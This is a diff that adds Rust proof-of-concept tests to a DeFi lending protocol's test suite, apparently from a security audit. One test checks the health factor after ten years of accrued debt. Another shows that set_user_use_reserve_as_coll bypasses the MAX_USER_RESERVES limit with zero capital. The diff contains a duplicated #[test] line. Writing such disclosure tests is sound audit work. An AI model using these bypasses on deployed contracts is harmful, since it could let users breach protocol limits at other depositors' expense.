@@ -631,3 +631,107 @@ fn test_poc_swap_collateral_bypasses_max_user_reserves() {
     println!("swap_collateral to 16th: BYPASSED (vulnerability!)");
     println!("active reserves: {}/64", k2_shared::UserConfiguration { data: cfg_after.data }.count_active_reserves());
 }
+
+#[test]
+
+#[test]
+fn test_poc_prepare_liquidation_stale_hf() {
+    let env = Env::default();
+    env.mock_all_auths();
+    let setup = Setup::new(&env);
+
+    let collateral: u128 = 10_000_000_000;
+    let borrow: u128 = 7_900_000_000;
+
+    setup.router.supply(&setup.user, &setup.asset_a, &collateral, &setup.user, &0u32);
+    setup.router.borrow(&setup.user, &setup.asset_b, &borrow, &1u32, &0u32, &setup.user);
+
+    env.ledger().with_mut(|l| l.timestamp += 10 * 365 * 24 * 3600);
+
+    let new_expiry = env.ledger().timestamp() + 604_800;
+    setup.oracle.set_manual_override(&setup.admin,
+        &price_oracle::Asset::Stellar(setup.asset_a.clone()),
+        &Some(PRICE_ONE_DOLLAR), &Some(new_expiry));
+    setup.oracle.set_manual_override(&setup.admin,
+        &price_oracle::Asset::Stellar(setup.asset_b.clone()),
+        &Some(PRICE_ONE_DOLLAR), &Some(new_expiry));
+
+    let account_data = setup.router.get_user_account_data(&setup.user);
+    println!("HF after 10 years: {}", account_data.health_factor);
+    println!("Liquidatable: {}", account_data.health_factor < k2_shared::WAD);
+}
+
+#[test]
+fn test_poc_set_collateral_bypasses_max_user_reserves() {
+    let env = Env::default();
+    env.mock_all_auths();
+    let setup = Setup::new(&env);
+
+    let supply_amount: u128 = 1_000_000_000;
+
+    // Fill slots 0 and 1
+    setup.router.supply(&setup.user, &setup.asset_a, &supply_amount, &setup.user, &0u32);
+    setup.router.supply(&setup.user, &setup.asset_b, &supply_amount, &setup.user, &0u32);
+
+    // Fill slots 2-14
+    for _ in 0..13u32 {
+        let (asset, _a, _d) = Setup::register_reserve(
+            &env, &setup.admin, &setup.pool_configurator,
+            &setup.router, &setup.router_addr,
+            &setup.oracle, &setup.interest_rate_strategy,
+            8000, 8500,
+        );
+        token::StellarAssetClient::new(&env, &asset)
+            .mint(&setup.user, &(supply_amount as i128));
+        token::Client::new(&env, &asset).approve(
+            &setup.user, &setup.router_addr,
+            &(supply_amount as i128), &(env.ledger().sequence() + 10_000),
+        );
+        setup.router.supply(&setup.user, &asset, &supply_amount, &setup.user, &0u32);
+    }
+
+    let cfg = setup.router.get_user_configuration(&setup.user);
+    assert_eq!(
+        k2_shared::UserConfiguration { data: cfg.data }.count_active_reserves(),
+        15, "should be at MAX_USER_RESERVES"
+    );
+
+    // Register 16th reserve — user has ZERO balance in it
+    let (asset_16, _a16, _d16) = Setup::register_reserve(
+        &env, &setup.admin, &setup.pool_configurator,
+        &setup.router, &setup.router_addr,
+        &setup.oracle, &setup.interest_rate_strategy,
+        8000, 8500,
+    );
+
+    // PART 1: supply() to 16th is BLOCKED
+    token::StellarAssetClient::new(&env, &asset_16)
+        .mint(&setup.user, &(supply_amount as i128));
+    token::Client::new(&env, &asset_16).approve(
+        &setup.user, &setup.router_addr,
+        &(supply_amount as i128), &(env.ledger().sequence() + 10_000),
+    );
+    let supply_result = setup.router.try_supply(
+        &setup.user, &asset_16, &supply_amount, &setup.user, &0u32,
+    );
+    assert!(supply_result.is_err(), "supply to 16th must fail");
+
+    // PART 2: set_user_use_reserve_as_coll BYPASSES — no balance needed, no DEX, no capital
+    // router.rs line ~1280: set_using_as_collateral called with no MAX_USER_RESERVES check
+    let result = setup.router.try_set_user_use_reserve_as_coll(
+        &setup.user,
+        &asset_16,
+        &true,
+    );
+    assert!(result.is_ok(), "VULNERABILITY: set_user_use_reserve_as_coll bypassed MAX_USER_RESERVES");
+
+    let cfg_after = setup.router.get_user_configuration(&setup.user);
+    assert_eq!(
+        k2_shared::UserConfiguration { data: cfg_after.data }.count_active_reserves(),
+        16, "count should be 16 after bypass"
+    );
+
+    println!("supply to 16th:                    BLOCKED (correct)");
+    println!("set_user_use_reserve_as_coll 16th: BYPASSED (vulnerability!) — zero capital required");
+    println!("active reserves: {}/64", k2_shared::UserConfiguration { data: cfg_after.data }.count_active_reserves());
+}
